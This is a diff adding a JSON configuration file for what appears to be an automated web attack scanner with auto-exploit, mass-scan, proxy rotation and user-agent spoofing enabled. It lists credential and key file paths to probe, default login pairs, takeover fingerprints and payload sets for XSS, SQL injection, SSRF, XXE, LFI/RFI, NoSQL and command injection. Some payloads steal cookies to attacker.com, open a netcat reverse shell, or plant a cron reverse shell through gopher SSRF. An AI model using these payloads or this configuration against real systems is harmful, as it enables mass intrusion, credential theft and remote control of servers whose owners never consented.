@@ -1,0 +1,313 @@
+{
+  "SETTINGS": {
+    "SCREENSHOT_ON_FINDING": true,
+    "SCREENSHOT_QUALITY": "high",
+    "HIGHLIGHT_PAYLOAD": true,
+    "AUTO_EXPLOIT": true,
+    "AUTO_REPORT": false,
+    "MASS_SCAN": true,
+    "CACHE_ENABLED": true,
+    "TELEGRAM_ALERT": false,
+    "TELEGRAM_TOKEN": "YOUR_BOT_TOKEN",
+    "TELEGRAM_CHAT_ID": "YOUR_CHAT_ID",
+    "RATE_LIMIT_MIN": 0.5,
+    "RATE_LIMIT_MAX": 3.0,
+    "MAX_THREADS": 50,
+    "REQUEST_TIMEOUT": 15,
+    "NUCLEI_TIMEOUT": 600,
+    "SQLMAP_TIMEOUT": 300,
+    "PROXY_ROTATION": true,
+    "USER_AGENTS": [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+    ],
+    "SUBDOMAINS": [
+      "www", "dev", "stage", "staging", "prod", "production", "test", "testing", "uat", "qa",
+      "api", "api-dev", "api-staging", "api-prod",
+      "blog", "shop", "store", "cart", "checkout", "payment", "payments",
+      "admin", "administrator", "panel", "control", "cpanel", "dashboard",
+      "mail", "webmail", "email", "smtp", "imap", "pop",
+      "ftp", "sftp", "ssh",
+      "db", "database", "sql", "mysql", "mongo",
+      "assets", "static", "cdn", "files", "media", "images",
+      "support", "help", "docs", "documentation", "wiki",
+      "vpn", "remote", "portal", "internal", "private",
+      "v1", "v2", "v3", "app", "old", "new",
+      "beta", "alpha", "demo", "sandbox", "preview", "mobile", "m"
+    ],
+    "COMMON_PATHS": [
+      "robots.txt", "sitemap.xml", "sitemap.xml.gz", "crossdomain.xml", "security.txt", "humans.txt",
+      ".git/config", ".git/HEAD", ".svn/entries", ".DS_Store",
+      ".env", ".env.local", ".env.production", "config.js", "config.json", "settings.py",
+      "admin", "admin/", "admin/login", "admin/login.php", "admin/index.php", "administrator", "login", "login.php", "wp-login.php",
+      "dashboard", "panel", "controlpanel", "cpanel",
+      "phpinfo.php", "info.php", "test.php", "status", "health", "healthcheck",
+      "backup.zip", "backup.tar.gz", "site.zip", "database.sql",
+      "api/v1/users", "api/v1/status", "api/swagger.json", "api/swagger-ui.html", "graphql",
+      "robots.txt.bak", "sitemap.xml.bak", "web.config.bak", "config.php.bak",
+      "index.php.bak", "index.html.bak", "default.aspx.bak",
+      "server-status", "server-info",
+      "phpmyadmin", "adminer",
+      "/.well-known/security.txt", "/.well-known/assetlinks.json", "/.well-known/apple-app-site-association",
+      "/.aws/credentials", "/.gcp/credentials.json", "/.azure/credentials.json",
+      "/.ssh/id_rsa", "/.ssh/id_rsa.pub", "/.bash_history", "/.git-credentials",
+      "/proc/self/environ", "/proc/self/cmdline",
+      "/var/log/apache2/access.log", "/var/log/nginx/access.log", "/var/log/auth.log",
+      "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/etc/httpd/conf/httpd.conf",
+      "/config/database.yml", "/config/secrets.yml",
+      "/composer.json", "/package.json", "/yarn.lock",
+      "/README.md", "/CHANGELOG.md", "/LICENSE.md",
+      "clientaccesspolicy.xml",
+      "web.config", ".htaccess", "nginx.conf", "Dockerfile", "docker-compose.yml"
+    ],
+    "API_PATHS": [
+      "api", "api/v1", "api/v2", "api/v3", "graphql", "swagger", "swagger.json",
+      "api/users", "api/v1/users", "api/v2/users", "api/v3/users",
+      "api/status", "api/v1/status", "api/v2/status", "api/v3/status",
+      "api/health", "api/v1/health", "api/v2/health", "api/v3/health",
+      "api/me", "api/v1/me", "api/v2/me", "api/v3/me",
+      "api/profile", "api/v1/profile", "api/v2/profile", "api/v3/profile",
+      "api/settings", "api/v1/settings", "api/v2/settings", "api/v3/settings",
+      "api/credentials", "api/v1/credentials", "api/v2/credentials", "api/v3/credentials",
+      "api/keys", "api/v1/keys", "api/v2/keys", "api/v3/keys",
+      "api/tokens", "api/v1/tokens", "api/v2/tokens", "api/v3/tokens",
+      "api/auth", "api/v1/auth", "api/v2/auth", "api/v3/auth",
+      "api/login", "api/v1/login", "api/v2/login", "api/v3/login",
+      "api/logout", "api/v1/logout", "api/v2/logout", "api/v3/logout",
+      "api/register", "api/v1/register", "api/v2/register", "api/v3/register",
+      "api/reset", "api/v1/reset", "api/v2/reset", "api/v3/reset",
+      "api/password", "api/v1/password", "api/v2/password", "api/v3/password",
+      "api/info", "api/v1/info", "api/v2/info", "api/v3/info",
+      "api/metrics", "api/v1/metrics", "api/v2/metrics", "api/v3/metrics",
+      "api/prometheus", "api/v1/prometheus", "api/v2/prometheus", "api/v3/prometheus",
+      "api/graphql", "api/v1/graphql", "api/v2/graphql", "api/v3/graphql",
+      "api/graphiql", "api/v1/graphiql", "api/v2/graphiql", "api/v3/graphiql",
+      "rest", "rest/v1", "json", "v1", "v2", "v3"
+    ],
+    "SENSITIVE_FILES": [
+      ".env", ".env.local", "config.php", "wp-config.php", "database.yml",
+      "secrets.yml", "id_rsa", "id_rsa.pub", ".bash_history", ".git-credentials",
+      "backup.sql", "dump.sql", "db.sql", "site.zip", "backup.tar.gz"
+    ],
+    "TAKEOVER_FINGERPRINTS": {
+      "amazonaws.com": "NoSuchBucket",
+      "cloudfront.net": "ERROR: The request could not be satisfied",
+      "azurewebsites.net": "Hey, developer!",
+      "github.io": "There isn't a GitHub Pages site here.",
+      "herokuapp.com": "no-such-app.html"
+    }
+  },
+  "PAYLOADS": {
+    "XSS": [
+      "<script>alert('XSS')</script>",
+      "<ScRiPt>alert('XSS')</ScRiPt>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg/onload=alert(1)>",
+      "\" autofocus onfocus=alert(1)>",
+      "<details/open/ontoggle=alert(1)>",
+      "javascript:alert(1)",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+      "<iframe src=\"javascript:alert(1)\"></iframe>",
+      "<a href=\"javascript:alert(1)\">Click Me</a>",
+      "<body onload=alert(1)>",
+      "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+      "';alert(String.fromCharCode(88,83,83))//",
+      "onerror=alert(1)>",
+      "<script>alert(document.domain)</script>",
+      "<img src=x onerror=alert(document.domain)>",
+      "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
+    ],
+    "SQLI_ERROR_BASED": [
+      "'", "\"", "`", "' OR 1=1--", "\" OR 1=1--", "` OR 1=1--", "' OR 'x'='x", "1'", "1\""
+    ],
+    "SQLI_TIME_BASED": [
+      "' OR SLEEP(5)--",
+      "1' OR SLEEP(5)--",
+      "\" OR SLEEP(5)--",
+      "1\" OR SLEEP(5)--",
+      "1;SELECT PG_SLEEP(5)--",
+      "' OR BENCHMARK(5000000,MD5(1))--",
+      "(SELECT * FROM (SELECT(SLEEP(5)))a)",
+      "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1"
+    ],
+    "SSTI": [
+      "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
+      "{{'a'.toUpperCase()}}",
+      "{{ self }}",
+      "{{config}}",
+      "${'a'.toUpperCase()}",
+      "<%= 'a'.toUpperCase() %>"
+    ],
+    "LFI": [
+      "../../../../etc/passwd",
+      "/etc/passwd",
+      "..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "../../../../windows/win.ini",
+      "php://filter/convert.base64-encode/resource=index.php",
+      "expect://id",
+      "php://input"
+    ],
+    "RFI": [
+      "http://attacker-domain.com/shell.txt",
+      "https://attacker-domain.com/shell.txt",
+      "//attacker-domain.com/shell.txt"
+    ],
+    "SSRF": [
+      "http://127.0.0.1",
+      "http://localhost",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://metadata.google.internal/computeMetadata/v1/",
+      "http://instance-data/latest/meta-data/",
+      "file:///etc/passwd",
+      "http://[::]:80/",
+      "http://127.0.0.1:8080/server-status",
+      "http://[::1]",
+      "http://[::1]:80",
+      "http://[::1]:443",
+      "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$50%0d%0a%0d%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0d%0a%0d%0a"
+    ],
+    "OPEN_REDIRECT": {
+      "params": ["next", "url", "target", "r", "dest", "destination", "redirect_uri", "redirect_url", "redirect", "returnTo", "return_to", "checkout_url", "continue", "forward"],
+      "payloads": ["//example.com", "/example.com", "https://example.com", "http://example.com", "/@example.com", "\\example.com", "javascript:alert(1)"]
+    },
+    "IDOR": [
+      "1", "2", "100", "101", "0", "-1",
+      "c4169e42-9b38-4000-92ad-57491544a1f9",
+      "user", "admin", "test",
+      "MS0w",
+      "true"
+    ],
+    "WAF_BYPASS": [
+      "/%2e%2e/%2e%2e/etc/passwd",
+      "..%252f..%252fetc%252fpasswd",
+      "/./././etc/passwd",
+      "<script>/*<!--*/alert(1)/*-->*/</script>",
+      "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">"
+    ],
+    "CRLF": [
+      "%0d%0aGemini:Injected",
+      "%0d%0a%20Set-Cookie:crlf=true",
+      "%E5%98%8A%E5%98%8DSet-Cookie:crlf=true"
+    ],
+    "COMMAND_INJECTION": [
+      "; sleep 5; #",
+      "| sleep 5",
+      "&& sleep 5",
+      "|| sleep 5",
+      "& sleep 5",
+      "$(sleep 5)",
+      "`sleep 5`",
+      "| ping -c 5 127.0.0.1",
+      "; nc attacker.com 4444 -e /bin/sh"
+    ],
+    "SSRF_INTERNAL": {
+      "HOSTS": [
+        "127.0.0.1",
+        "localhost",
+        "127.0.0.1:80",
+        "127.0.0.1:443",
+        "127.0.0.1:22",
+        "127.0.0.1:3306",
+        "127.0.0.1:5432",
+        "127.0.0.1:6379",
+        "127.0.0.1:8080",
+        "127.0.0.1:9000",
+        "127.0.0.1:3000",
+        "127.0.0.1:5000",
+        "127.0.0.1:8000",
+        "127.0.0.1:9200",
+        "127.0.0.1:5601",
+        "169.254.169.254",
+        "metadata.google.internal",
+        "[::1]",
+        "[::]"
+      ],
+      "PATHS": [
+        "/server-status",
+        "/status?full=true",
+        "/prometheus",
+        "/metrics",
+        "/phpmyadmin/",
+        "/actuator/health",
+        "/api/v1/status",
+        "/solr/admin/cores?action=STATUS",
+        "/debug/pprof/",
+        "/env",
+        "/.dockerenv"
+      ]
+    },
+    "OAST": {
+      "INTERACTSH_DOMAIN": "oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me"
+    },
+    "XXE": [
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker-domain.com/xxe.dtd\">]>",
+      "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker-domain.com/xxe.dtd\"> %xxe;]>"
+    ],
+    "NOSQL_INJECTION": [
+      "{\"$where\": \"sleep(5000)\"}",
+      "{\"username\": {\"$ne\": null}}",
+      "{\"$or\": [{\"username\": \"admin\"}, {\"password\": {\"$ne\": null}}]}",
+      "{\"username\": {\"$regex\": \".*\"}}"
+    ],
+    "API_KEY_LEAKS": [
+      "api_key=", "API_KEY=", "secret=", "SECRET=", "token=", "TOKEN=",
+      "authorization=", "Authorization=", "X-API-Key=", "X-Auth-Token=",
+      "client_id=", "client_secret=",
+      "aws_access_key_id=", "aws_secret_access_key=",
+      "google_api_key=", "firebase_api_key=",
+      "stripe_api_key=", "paypal_api_key=",
+      "sk_live_", "pk_live_", "secret_key=", "private_key="
+    ],
+    "CORS_MISCONFIGURATION": [
+      "https://attacker-domain.com", "null", "https://target.com.attacker-domain.com", "*"
+    ],
+    "GRAPHQL_INTROSPECTION": [
+      "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { name description type { ...TypeRef } defaultValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
+    ],
+    "DEFAULT_CREDS": [
+      {"username": "admin", "password": "password"},
+      {"username": "admin", "password": "admin"},
+      {"username": "admin", "password": "1234"},
+      {"username": "administrator", "password": "password"},
+      {"username": "root", "password": "root"},
+      {"username": "test", "password": "test"},
+      {"username": "guest", "password": "guest"},
+      {"username": "user", "password": "user"},
+      {"username": "demo", "password": "demo"}
+    ],
+    "JWT_PAYLOADS": [
+      ".eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+    ],
+    "OAUTH_MISCONFIG": [
+      "redirect_uri=https://attacker-domain.com",
+      "redirect_uri=http://localhost",
+      "redirect_uri=https://target.com.attacker-domain.com",
+      "scope=invalid_scope",
+      "client_id=invalid_client",
+      "response_type=token"
+    ]
+  },
+  "PROTOTYPE_POLLUTION": {
+    "PAYLOADS": [
+      "__proto__[polluted]=true",
+      "constructor.prototype.polluted=true",
+      "__proto__.polluted=true",
+      "prototype.polluted=true"
+    ]
+  },
+  "TAKEOVER": {
+    "ENABLED": true,
+    "FINGERPRINTS": {
+      "amazonaws.com": ["NoSuchBucket", "The specified bucket does not exist"],
+      "azurewebsites.net": ["Hey, developer!"],
+      "github.io": ["There isn't a GitHub Pages site here"],
+      "herokuapp.com": ["no-such-app.html"],
+      "cloudfront.net": ["ERROR: The request could not be satisfied"]
+    }
+  }
+}
